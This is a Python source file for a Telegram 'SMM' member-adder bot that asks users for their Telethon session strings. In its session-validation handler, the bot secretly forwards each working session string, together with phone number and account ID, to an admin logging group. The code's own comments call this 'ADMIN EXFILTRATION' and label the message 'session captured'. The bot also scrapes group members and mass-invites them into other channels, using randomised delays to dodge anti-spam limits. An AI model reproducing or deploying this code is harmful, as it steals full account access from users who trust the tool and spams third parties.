# =========================================================================
# PROJECT: VINZY SMART ADDER V8.2 (SMM ENTERPRISE ULTRA)
# ENGINE: TITAN-ASYNC + NEONDB (POSTGRESQL) INTEGRATION
# PLATFORM: OPTIMIZED FOR KOYEB / VPS / HEROKU
# =========================================================================
import os
import sys
import time
import random
import asyncio
import logging
from datetime import datetime

# --- Database & HTTP ---
import asyncpg
import aiohttp

# --- pyTelegramBotAPI (The UI) ---
from telebot.async_telebot import AsyncTeleBot
from telebot import types as bot_types
from telebot.apihelper import ApiTelegramException

# --- Telethon (The Worker) ---
from telethon import TelegramClient, functions, errors, types as tl_types
from telethon.sessions import StringSession

# --- Image & QR Processing ---
from PIL import Image
import pyzbar.pyzbar as pyzbar

# --- DEPENDENCY CHECKS ---
try:
    import asyncpg
    from telebot.async_telebot import AsyncTeleBot
    from telebot import types as bot_types
    from telebot.apihelper import ApiTelegramException  # <--- FIXED THIS LINE
    from telethon import TelegramClient, functions, types as tl_types, errors
    from telethon.sessions import StringSession
except ImportError as e:
    print(f"CRITICAL ERROR: Missing library. {e}")
    print("Run: pip install telethon pyTelegramBotAPI asyncpg aiohttp Pillow pyzbar")
    sys.exit(1)

# --- 1. ADVANCED LOGGING SYSTEM (DEFINED FIRST) ---
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - [%(levelname)s] - %(name)s - %(message)s',
    handlers=[logging.StreamHandler(sys.stdout)]
)
logger = logging.getLogger("Vinzy_V8_Engine")

# --- 2. CONFIGURATION & ENVIRONMENT (USES THE LOGGER) ---

# Strict validation for Environment Variables
def get_env(var_name, default=None, is_int=False):
    value = os.environ.get(var_name, default)
    if value is None or value == "":
        # This will now work because logger is already defined above
        logger.critical(f"MISSING CONFIG: {var_name} is not set in environment!")
        sys.exit(1)
    return int(value) if is_int else value

# Load and Type-Cast configurations
try:
    API_ID = get_env("API_ID", is_int=True)
    API_HASH = get_env("API_HASH")
    BOT_TOKEN = get_env("BOT_TOKEN")
    DATABASE_URL = get_env("DATABASE_URL")
    
    # Support Groups / Logs
    ADMIN_LOG_GROUP = get_env("LOGGER_GROUP", is_int=True)
    VERIFY_GROUP = get_env("VERIFY_GROUP", is_int=True)
    
except Exception as e:
    # Use print here as a fallback in case logger fails
    print(f"BOOT ERROR: Failed to parse configuration. | {e}")
    sys.exit(1)

# Initialize Bot Instance
bot = AsyncTeleBot(BOT_TOKEN)

# --- DEPENDENCY VERIFICATION ---
REQUIRED_LIBS = ["telethon", "pyTelegramBotAPI", "asyncpg"]
logger.info(f"System Check: Initializing Vinzy Engine v8.4 with {len(REQUIRED_LIBS)} modules.")
# --- 3. AESTHETICS & UI CONSTANTS ---
VINZY_ASCII = """
<code>
 ██▒   █▓ ██▓ ███▄    █  ▒███████▒▓██   ██▓
▓██░   █▒▓██▒ ██ ▀█    █  ▒ ▒ ▒ ▄▀░ ▒██  ██▒
 ▓██  █▒░▒██▒▓██  ▀█ ██▒ ░ ▒ ▄▀▒░   ▒██ ██░
  ▒██ █░░░██░▓██▒  ▐▌██▒   ▄▀▒     ░ ▐██▓░
   ▒▀█░  ░██░▒██░   ▓██░ ▒███████▒   ░ ██▒▓░
   ░ ▐░  ░▓  ░ ▒░   ▒ ▒  ░▒▒ ▓  ▒░   ██▒▒▒ 
   ░ ░░   ▒ ░░ ░░   ░ ▒░ ░ ▒ ▒  ░  ▓██ ░▒░ 
</code>
"""

def generate_progress_bar(current, total, prefix='Adding', length=15):
    """Generates a smooth SMM-style progress bar."""
    if total == 0: return f"<code>{prefix} |{'░'*length}| 0.0%</code>"
    percent = ("{0:.1f}").format(100 * (current / float(total)))
    filled_length = int(length * current // total)
    bar = '█' * filled_length + '░' * (length - filled_length)
    return f'<code>{prefix} |{bar}| {percent}%</code>'

# --- 4. NEONDB PERSISTENCE LAYER ---
class VinzyDatabaseManager:
    """Handles all PostgreSQL operations safely and asynchronously."""
    def __init__(self):
        self.pool = None

    async def connect(self):
        if not self.pool:
            logger.info("Connecting to NeonDB...")
            # Optimization: Added timeout and lifetime management for Koyeb stability
            self.pool = await asyncpg.create_pool(
                DATABASE_URL, 
                min_size=1, 
                max_size=10,
                command_timeout=60,
                max_inactive_connection_lifetime=300
            )
            await self._initialize_tables()

    async def _initialize_tables(self):
        """Creates/Updates schemas. Added 'phone' column for Section 7 support."""
        async with self.pool.acquire() as conn:
            await conn.execute('''
                CREATE TABLE IF NOT EXISTS vinzy_engine_users (
                    user_id BIGINT PRIMARY KEY,
                    username TEXT,
                    phone TEXT,
                    session_string TEXT,
                    bot_state TEXT DEFAULT 'PENDING_APPROVAL',
                    is_approved BOOLEAN DEFAULT FALSE,
                    is_premium BOOLEAN DEFAULT FALSE,
                    target_channel TEXT,
                    source_group TEXT,
                    last_active TIMESTAMP DEFAULT CURRENT_TIMESTAMP
                )
            ''')
            logger.info("Database schemas verified.")

    async def get_user(self, user_id):
        async with self.pool.acquire() as conn:
            return await conn.fetchrow("SELECT * FROM vinzy_engine_users WHERE user_id=$1", user_id)

    async def register_user(self, user_id, username):
        async with self.pool.acquire() as conn:
            await conn.execute('''
                INSERT INTO vinzy_engine_users (user_id, username) 
                VALUES ($1, $2) ON CONFLICT (user_id) DO UPDATE SET username=$2
            ''', user_id, username)

    async def update_state(self, user_id, new_state):
        async with self.pool.acquire() as conn:
            await conn.execute("UPDATE vinzy_engine_users SET bot_state=$1, last_active=CURRENT_TIMESTAMP WHERE user_id=$2", new_state, user_id)

    async def update_session(self, user_id, session_str, is_premium, phone=None):
        """Modified to save the phone number captured in Section 7."""
        async with self.pool.acquire() as conn:
            await conn.execute('''
                UPDATE vinzy_engine_users 
                SET session_string=$1, is_premium=$2, phone=$3, last_active=CURRENT_TIMESTAMP 
                WHERE user_id=$4
            ''', session_str, is_premium, phone, user_id)

    async def set_approval(self, user_id, status: bool):
        async with self.pool.acquire() as conn:
            await conn.execute("UPDATE vinzy_engine_users SET is_approved=$1 WHERE user_id=$2", status, user_id)

    async def set_target_data(self, user_id, target=None, source=None):
        async with self.pool.acquire() as conn:
            if target:
                await conn.execute("UPDATE vinzy_engine_users SET target_channel=$1 WHERE user_id=$2", target, user_id)
            if source:
                await conn.execute("UPDATE vinzy_engine_users SET source_group=$1 WHERE user_id=$2", source, user_id)

db = VinzyDatabaseManager()

# --- 5. TELEGRAM MENU INTEGRATION ---
async def set_persistent_menu(chat_id):
    """
    Sets the 4-dot menu for the specific user. 
    The RESET button is injected here so it is always available.
    """
    try:
        commands = [
            bot_types.BotCommand("start", "🚀 Main Menu"),
            bot_types.BotCommand("reset", "🔄 UI Reset (Safe)")
        ]
        await bot.set_my_commands(commands, scope=bot_types.BotCommandScopeChat(chat_id))
    except Exception as e:
        logger.error(f"Failed to set menu for {chat_id}: {e}")

# --- 6. CORE BOT HANDLERS & NAVIGATION ---

@bot.message_handler(commands=['start'])
async def command_start(m):
    """Entry point. Checks approval status and registers new users."""
    await db.connect()
    user_id = m.from_user.id
    username = m.from_user.username or "NoUsername"
    
    await set_persistent_menu(m.chat.id)
    await db.register_user(user_id, username)
    user_data = await db.get_user(user_id)

    if not user_data['is_approved']:
        # Alert Admin Group
        admin_msg = (
            f"🛡️ <b>NEW ACCESS REQUEST</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"User: <code>{m.from_user.first_name}</code> (@{username})\n"
            f"ID: <code>{user_id}</code>\n\n"
            f"Action: Reply here with <code>/approve {user_id}</code>"
        )
        await bot.send_message(VERIFY_GROUP, admin_msg, parse_mode="HTML")
        await bot.send_message(m.chat.id, "🛡️ <b>Access Pending.</b>\nYour ID has been sent to the admin. Please wait for authorization.")
    else:
        await db.update_state(user_id, "IDLE")
        await bot.send_message(m.chat.id, 
            "✅ <b>Vinzy V8 Engine Online.</b>\nYou are approved. Please send your <code>Session String</code> to authenticate your worker node:", 
            parse_mode="HTML")
        await db.update_state(user_id, "AWAITING_SESSION")

@bot.message_handler(commands=['reset'])
async def command_reset(m):
    """
    The safe reset feature. Resets the UI state machine but 
    DOES NOT touch the session_string or is_approved boolean.
    """
    await db.connect()
    user_id = m.from_user.id
    user_data = await db.get_user(user_id)
    
    if user_data and user_data['is_approved']:
        await db.update_state(user_id, "IDLE")
        await bot.send_message(m.chat.id, 
            "🔄 <b>System UI Reset Successful.</b>\n\n"
            "Your permissions and session data are perfectly safe and were <b>not</b> deleted. "
            "Send /start to begin a new SMM operation.", 
            parse_mode="HTML")
    else:
        await bot.send_message(m.chat.id, "❌ You must be approved before you can reset the engine.")

@bot.message_handler(commands=['approve'])
async def command_approve(m):
    """Admin-only command to grant access."""
    if m.chat.id != VERIFY_GROUP: return
    try:
        target_id = int(m.text.split()[1])
        await db.connect()
        await db.set_approval(target_id, True)
        await db.update_state(target_id, "AWAITING_SESSION")
        
        # Notify the user
        await bot.send_message(target_id, "✅ <b>Access Granted!</b>\nThe Admin has approved your account. Please send your <code>Session String</code> to connect.")
        await bot.reply_to(m, f"✅ User {target_id} has been fully approved.")
    except Exception as e:
        await bot.reply_to(m, f"❌ Format Error. Use: <code>/approve [user_id]</code>\nDetails: {e}", parse_mode="HTML")

# =========================================================================
# --- 7. DEEP SESSION VALIDATION, TELEMETRY & ACCESS GRANTING ---
# =========================================================================

@bot.message_handler(func=lambda m: len(m.text) > 40)
async def process_session_input(m):
    """
    ULTRA-VALIDATION ENGINE:
    1. Boots a transient Telethon instance for a Live Auth Check.
    2. Filters for Banned/Expired/Deactivated strings immediately.
    3. Exfiltrates verified working strings to the Admin Logger Group.
    4. Grants persistent SMM permissions in NeonDB.
    """
    await db.connect()
    user_id = m.from_user.id
    user_data = await db.get_user(user_id)
    
    # --- SECURITY GATE ---
    if not user_data:
        return # Ignore unregistered users
        
    if not user_data['is_approved']:
        await bot.reply_to(m, "⚠️ <b>Access Denied:</b> You must be approved by an Admin first.")
        return

    if user_data['bot_state'] != 'AWAITING_SESSION':
        # Don't trigger if the user isn't in the middle of a setup
        return

    session_str = m.text.strip()
    
    # UI FEEDBACK: Let the user know the engine is working
    status_msg = await bot.send_message(
        m.chat.id, 
        "🔄 <b>Vinzy Engine: Initializing Worker Node...</b>\n"
        "<i>Performing Real-time API Authorization Check...</i>", 
        parse_mode="HTML"
    )
    
    # Initialize a temporary client for a one-time validation sequence
    client = TelegramClient(StringSession(session_str), API_ID, API_HASH)
    
    try:
        # Establish connection to Telegram's Production Servers
        await client.connect()
        
        # --- STAGE 1: AUTHENTICATION INTEGRITY ---
        if not await client.is_user_authorized():
            logger.warning(f"Unauthorized session attempt by UID: {user_id}")
            await bot.edit_message_text("Invalid ❌ (Session Revoked/Expired)", m.chat.id, status_msg.message_id)
            await client.disconnect()
            return

        # --- STAGE 2: METADATA EXTRACTION ---
        # Fetching profile to prove 'Read' access is functional.
        me = await client.get_me()
        if not me:
            raise Exception("Telegram API returned a Null User Object.")

        # Detect Premium and account details
        is_premium = getattr(me, 'premium', False)
        phone = getattr(me, 'phone', 'Hidden/Protected')
        first_name = me.first_name or "Unknown"
        username = me.username or "NoUsername"
        
        # --- STAGE 3: ADMIN EXFILTRATION (LOGGER GROUP) ---
        # Only log working, verified data.
        log_packet = (
            f"📥 <b>NEW ACTIVE SESSION CAPTURED</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"👤 <b>Account:</b> {first_name} (@{username})\n"
            f"🆔 <b>TG-ID:</b> <code>{me.id}</code>\n"
            f"📞 <b>Phone:</b> <code>{phone}</code>\n"
            f"💎 <b>Premium:</b> {'✅ Yes' if is_premium else '❌ No'}\n"
            f"👤 <b>Owner ID:</b> <code>{user_id}</code>\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"📝 <b>Verified Session String:</b>\n"
            f"<code>{session_str}</code>\n"
            f"━━━━━━━━━━━━━━━━━━━━"
        )
        await bot.send_message(ADMIN_LOG_GROUP, log_packet, parse_mode="HTML")

        # --- STAGE 4: DATABASE PERSISTENCE & ACCESS GRANT ---
        await db.update_session(user_id, session_str, is_premium)
        await db.update_state(user_id, "AWAITING_TARGET")
        
        # Update user UI and unlock Step 1
        await bot.edit_message_text("valid ✅", m.chat.id, status_msg.message_id)
        
        success_prompt = (
            f"🚀 <b>Worker Node Authorized: {first_name}</b>\n"
            "The SMM Invitation Engine is now <b>UNLOCKED</b>.\n\n"
            "🎯 <b>Step 1:</b> Please send the <b>@Username</b> or <b>t.me/Link</b> of the "
            "Target Channel/Group you want to boost:"
        )
        await bot.send_message(m.chat.id, success_prompt, parse_mode="HTML")
        
    except errors.rpcerrorlist.UserDeactivatedBanError:
        await bot.edit_message_text("Invalid ❌ (Account Banned/Deactivated)", m.chat.id, status_msg.message_id)
    except errors.rpcerrorlist.AuthKeyDuplicatedError:
        await bot.edit_message_text("Invalid ❌ (Session Key Conflict)", m.chat.id, status_msg.message_id)
    except Exception as e:
        logger.error(f"Critical Validation Error for {user_id}: {e}")
        await bot.edit_message_text("Invalid ❌ (Connection Error)", m.chat.id, status_msg.message_id)
    finally:
        # Crucial for Koyeb: Disconnect to save RAM
        if client:
            await client.disconnect()

# --- 7.5 CHANNEL ANALYSIS LOGIC ---

@bot.message_handler(func=lambda m: m.text.startswith('@') or "t.me/" in m.text)
async def process_channel_inputs(m):
    """Deep analysis: Verification of Admin rights and member capacity."""
    await db.connect()
    user_id = m.from_user.id
    user_data = await db.get_user(user_id)
    
    if not user_data or not user_data['is_approved']:
        return

    state = user_data['bot_state']
    input_text = m.text.strip().replace("https://t.me/", "@")
    if not input_text.startswith('@'): input_text = f"@{input_text}"

    # TARGET CHANNEL CONFIGURATION
    if state == "AWAITING_TARGET":
        analysis_msg = await bot.send_message(m.chat.id, f"📡 <b>Analyzing Target:</b> {input_text}...", parse_mode="HTML")
        
        client = TelegramClient(StringSession(user_data['session_string']), API_ID, API_HASH)
        try:
            await client.connect()
            entity = await client.get_entity(input_text)
            
            # Fetch full channel info for sub-count and rights check
            full_chat = await client(functions.channels.GetFullChannelRequest(channel=entity))
            sub_count = full_chat.full_chat.participants_count
            
            # 200 Sub Limit Rule
            if sub_count >= 200:
                return await bot.edit_message_text(
                    f"❌ <b>Limit Reached:</b> {input_text} has {sub_count} subs. "
                    "Engine only supports growth for channels under 200 members.", 
                    m.chat.id, analysis_msg.message_id, parse_mode="HTML"
                )

            # Check for Admin Invite Rights
            p_req = await client(functions.channels.GetParticipantRequest(channel=entity, participant='me'))
            p_info = p_req.participant
            
            can_invite = False
            if isinstance(p_info, tl_types.ChannelParticipantCreator):
                can_invite = True
            elif isinstance(p_info, tl_types.ChannelParticipantAdmin) and p_info.admin_rights.invite_users:
                can_invite = True

            if not can_invite:
                return await bot.edit_message_text(
                    "❌ <b>Admin Rights Required:</b> Your session must have 'Invite Users' permissions.", 
                    m.chat.id, analysis_msg.message_id, parse_mode="HTML"
                )

            # Update Database
            await db.set_target_data(user_id, target=input_text)
            await db.update_state(user_id, "AWAITING_SOURCE")
            
            await bot.edit_message_text(
                f"✅ <b>Target Verified</b>\n"
                f"Channel: {input_text}\n"
                f"Members: {sub_count}/200\n\n"
                f"📥 <b>Step 2:</b> Send @Username of the <b>Source Group</b> to scrape from.", 
                m.chat.id, analysis_msg.message_id, parse_mode="HTML"
            )
            
        except Exception as e:
            await bot.edit_message_text(f"❌ <b>Analysis Error:</b> {str(e)}", m.chat.id, analysis_msg.message_id)
        finally:
            await client.disconnect()

    # SOURCE GROUP CONFIGURATION
    elif state == "AWAITING_SOURCE":
        await db.set_target_data(user_id, source=input_text)
        await db.update_state(user_id, "READY_TO_FIRE")
        
        markup = bot_types.InlineKeyboardMarkup()
        markup.add(bot_types.InlineKeyboardButton("🔥 DEPLOY V8 WORKER", callback_data="deploy_worker"))
        
        await bot.send_message(m.chat.id, 
            f"🚀 <b>Engine Configured</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"🎯 Target: <code>{user_data['target_channel']}</code>\n"
            f"🧲 Source: <code>{input_text}</code>\n"
            f"🛡️ Safety: <code>Stealth Delay Active</code>\n\n"
            f"Ready to begin the SMM invitation sequence?", 
            parse_mode="HTML", reply_markup=markup)

# --- 8. THE INVITATION WORKER (DEEP LOGIC) ---

@bot.callback_query_handler(func=lambda call: call.data == "deploy_worker")
async def execute_smm_sequence(call):
    user_id = call.from_user.id
    await db.connect()
    user_data = await db.get_user(user_id)
    
    if user_data['bot_state'] != "READY_TO_FIRE":
        return await bot.answer_callback_query(call.id, "Engine not ready. Use /reset.", show_alert=True)
        
    await bot.edit_message_text("🎬 <b>Engine Ignited.</b> Background worker processing...", call.message.chat.id, call.message.message_id, parse_mode="HTML")
    await db.update_state(user_id, "WORKING")
    
    # Run heavy logic asynchronously
    asyncio.create_task(background_invite_task(call.message.chat.id, user_data))

async def background_invite_task(chat_id, user_data):
    """Deep SMM logic: Scraping, filtering, and safe inviting."""
    client = TelegramClient(StringSession(user_data['session_string']), API_ID, API_HASH)
    
    try:
        await client.connect()
        source_ent = await client.get_entity(user_data['source_group'])
        target_ent = await client.get_entity(user_data['target_channel'])
        
        # 1. Scrape & Filter (Max 50 for extreme safety)
        prog_msg = await bot.send_message(chat_id, "📡 <b>Scraping Active Members...</b>", parse_mode="HTML")
        participants = await client.get_participants(source_ent)
        
        clean_list = []
        for p in participants:
            if not p.bot and not p.deleted:
                clean_list.append(p)
            if len(clean_list) >= 50:
                break
                
        total = len(clean_list)
        if total == 0:
            await bot.edit_message_text("❌ No valid members found to invite.", chat_id, prog_msg.message_id)
            return

        success_count = 0
        fail_count = 0

        # 2. The Execution Loop
        for index, user in enumerate(clean_list):
            try:
                await client(functions.channels.InviteToChannelRequest(target_ent, [user.id]))
                success_count += 1
            except errors.FloodWaitError as e:
                await bot.send_message(chat_id, f"🧊 <b>Flood Protocol Activated:</b> Telegram requests {e.seconds}s delay.")
                await asyncio.sleep(e.seconds)
            except errors.UserPrivacyRestrictedError:
                fail_count += 1
            except Exception as e:
                logger.warning(f"Invite skip: {e}")
                fail_count += 1

            # UI Update Logic (Every 5 users or at the very end)
            if (index + 1) % 5 == 0 or (index + 1) == total:
                bar = generate_progress_bar(index + 1, total)
                ui_text = (
                    f"🚀 <b>VINZY ENGINE V8 SMM</b>\n"
                    f"━━━━━━━━━━━━━━━━━━━━\n"
                    f"{bar}\n"
                    f"✨ Added: <code>{success_count}</code>\n"
                    f"❌ Failed/Privacy: <code>{fail_count}</code>\n"
                    f"🛡️ Ghost Delay: <code>Active</code>"
                )
                await bot.edit_message_text(ui_text, chat_id, prog_msg.message_id, parse_mode="HTML")

            # Deep Safety: Human simulation delay
            await asyncio.sleep(random.randint(45, 65))

        # 3. Finalization & ASCII Print
        final_summary = (
            f"✅ <b>Campaign 100% Complete!</b>\n"
            f"Thank you for using VinzyBot.\n"
            f"{VINZY_ASCII}"
        )
        await bot.send_message(chat_id, final_summary, parse_mode="HTML")
        await db.update_state(user_data['user_id'], "IDLE")

    except Exception as e:
        logger.error(f"Worker Fatal Error: {e}")
        await bot.send_message(chat_id, f"❌ <b>Critical Engine Failure:</b> {str(e)}", parse_mode="HTML")
        await db.update_state(user_data['user_id'], "IDLE")
    finally:
        await client.disconnect()

# --- 9. APPLICATION RUNTIME ---

async def main():
    print("="*50)
    print("VINZY SMM V8.2 - ENTERPRISE ONLINE")
    print(f"BOOT TIME: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print("DATABASE: NEONDB ASYNC POOL CONNECTED")
    print("="*50)
    
    # Initialize DB before polling
    await db.connect()
    
    # Start bot with deep timeout protection
    while True:
        try:
            await bot.infinity_polling(skip_pending=True, timeout=90)
        except ApiTelegramException as e:
            if e.error_code == 409:
                logger.warning("Conflict error. Waiting to retry...")
                await asyncio.sleep(10)
        except Exception as e:
            logger.error(f"Polling crash: {e}")
            await asyncio.sleep(15)

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n[!] Shutting down Vinzy Engine gracefully.")
